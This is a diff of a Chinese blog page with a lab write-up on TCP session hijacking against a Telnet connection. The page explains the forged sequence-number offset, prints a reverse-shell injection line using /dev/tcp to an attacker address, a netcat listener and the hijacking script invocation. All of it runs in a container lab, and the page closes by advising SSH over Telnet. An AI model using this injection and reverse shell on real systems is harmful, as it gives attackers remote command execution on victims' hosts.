+</h3><p>攻击脚本中有这一行<code>newseq = old_tcp.ack + 10</code>，意思是伪造包的序列号比服务端期望的客户端序列号多10。刚发出时这个包的位置偏后，服务端不会立刻处理。受害者输入10个字符后，正常连接的序列号会推进10字节，推进到伪造包对应的位置时，服务端就会执行命令。所以这里需要在受害者 Telnet 界面中连续输入10个字符来触发攻击</p>
+<img src="11.png" style="width: 100%;" />
+<p>然后在用户容器中查看 <code>/tmp/success</code> 是否被创建，可以看到能找到这个文件，说明攻击成功</p>
+<img src="10.png" style="width: 50%;" />
 <h2 id="反向-shell-攻击">反向 Shell 攻击
-</h2><p>反向 Shell 是在会话劫持基础上的进一步利用。前面的会话劫持只是注入一条创建文件的命令，如果把注入内容改成反向连接命令，就可以让目标主机主动连接攻击者，并把命令执行环境交给攻击者</p>
-<p>这里的攻击依然发生在实验容器网络中，目标是让 <code>10.9.0.6</code> 主动连接攻击者 <code>10.9.0.1</code> 的 <code>9090</code> 端口</p>
+</h2><p>反向 Shell 是在会话劫持基础上的进一步攻击。前面的会话劫持只是注入一条创建文件的命令，如果把注入内容改成反向连接命令，就可以让用户主动连接攻击者，然后把命令执行权限交给攻击者</p>
 <h3 id="修改脚本">修改脚本
-</h3><p>打开 <code>hijacking_auto.py</code>，注释掉原来的 <code>touch</code> 命令，改为反向 Shell 命令</p>
+</h3><p>修改 <code>hijacking_auto.py</code>，把创建文件命令改为反向 Shell 命令，这条命令会让用户把输入输出重定向到攻击者的 <code>9090</code> 端口，效果类似远程终端</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data = &#34;\n/bin/bash -i &gt;/dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\n&#34;
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">/bin/bash -i &gt;/dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1</span><span class="se">\n</span><span class="s2">&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这条命令会让目标主机启动一个交互式 Bash，并把输入输出重定向到攻击者的 <code>9090</code> 端口</p>
-<h3 id="攻击者监听">攻击者监听
-</h3><p>在攻击者容器中新开一个终端窗口，监听 <code>9090</code> 端口</p>
+</div><h3 id="攻击者-3">攻击者
+</h3><p>在攻击者容器中新开一个终端监听 <code>9090</code> 端口</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -644,39 +732,26 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lnv 9090
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="11.png" style="width: 80%;" />
-<h3 id="执行劫持">执行劫持
-</h3><p>在攻击者原来的终端中运行会话劫持脚本</p>
+</div><p>在攻击者原来的终端执行攻击脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 hijacking_auto.py 10.9.0.5 10.9.0.6
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 hijacking_auto.py 10.9.0.5 10.9.0.6
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>回到受害者 Telnet 界面，连续输入 10 个字符触发脚本注入</p>
-<img src="12.png" style="width: 90%;" />
+</div><p>在受害者 Telnet 界面中连续输入10个字符来触发注入</p>
+<img src="11.png" style="width: 100%;" />
 <h3 id="验证-3">验证
-</h3><p>回到攻击者监听 <code>9090</code> 端口的窗口，如果攻击成功，可以看到来自 <code>10.9.0.6</code> 的连接，并获得目标主机的命令执行环境</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
-</span></span><span class="line"><span class="cl">hostname
-</span></span><span class="line"><span class="cl">ip addr
-</span></span></code></pre></td></tr></table>
-</div>
-</div><img src="13.png" style="width: 90%;" />
-<p>这说明攻击者已经通过 TCP 会话劫持向 Telnet 会话中注入了反向 Shell 命令，并让目标主机主动连接攻击者</p>
-<h2 id="实验结论">实验结论
-</h2><p>本次实验展示了 TCP 协议在不同场景下可能受到的攻击方式。SYN 洪泛攻击利用的是连接建立阶段的半连接状态，TCP Reset 攻击利用的是 RST 报文对已有连接的控制能力，TCP 会话劫持利用的是明文协议和 TCP 状态可伪造的问题，反向 Shell 则是在命令注入成功后的进一步利用</p>
-<p>这几个实验的共同点是攻击者都需要让伪造数据包看起来符合当前 TCP 状态。源 IP、目标 IP、端口、序列号和确认号只要有关键字段不匹配，目标主机就可能直接丢弃数据包</p>
-<p>从实验过程可以看出，TCP 本身只负责可靠传输，并不会验证通信双方的真实身份。对于 Telnet 这类明文协议来说，一旦攻击者能够监听或伪造会话数据，连接就很容易被干扰或劫持。实际环境中通常需要依赖 SSH、TLS、SYN Cookie、随机化初始序列号、防火墙规则等机制降低这类攻击的风险</p>
+</h3><p>回到攻击者的监听窗口，如果攻击成功，可以看到<code>Connection received on 10.9.0.6 51962</code>，后面的命令提示符也变成了<code>seed@099c6246dd29</code>，也就是用户的容器名称，这时攻击者输入的命令会直接作用在用户的主机上</p>
+<p>我这里创建了一个txt文件，回到用户容器查看这个文件，可以看到正是刚刚在攻击者容器写入的内容</p>
+<img src="12.png" style="width: 80%;" />
+<p>在攻击者端还可以看到用户容器中的所有文件，这会导致信息泄露等问题</p>
+<img src="13.png" style="width: 50%;" />
+<blockquote>
+<p>Telnet协议是不安全的，使用明文传输，攻击者可以直接获取通信内容。因此日常应该尽量避免使用这个协议，转而使用更安全的SSH协议</p>
+</blockquote>
 
 </section>
 
@@ -745,6 +820,25 @@ unicode: "f6d2"
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/mitnick/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/mitnick.jpg" loading="lazy" data-key="" data-hash="/images/cover/mitnick.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mitnick攻击</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -817,25 +911,6 @@ unicode: "f6d2"
 
         <div class="article-details">
             <h2 class="article-title">Sunshine&#43;Moonlight远程串流</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/post/op_add/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/cover/op1.jpg" loading="lazy" data-key="" data-hash="/images/cover/op1.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">OpenWrt插件推荐与配置</h2>
         </div>
     </a>
 </article>
@@ -1047,10 +1122,12 @@ unicode: "f6d2"
       
       
       
+      
+      
       共发表文章 
-      <span class="number-highlight">26</span> 
+      <span class="number-highlight">27</span> 
       篇 ，总计 
-      <span class="number-highlight">110.58</span> 
+      <span class="number-highlight">114.11</span> 
       k 字
   </div>
   <div>
@@ -1094,6 +1171,8 @@ if (busuanziValue) {
 }
 </script>
     <section class="powerby">
+        
+        
         
         
         
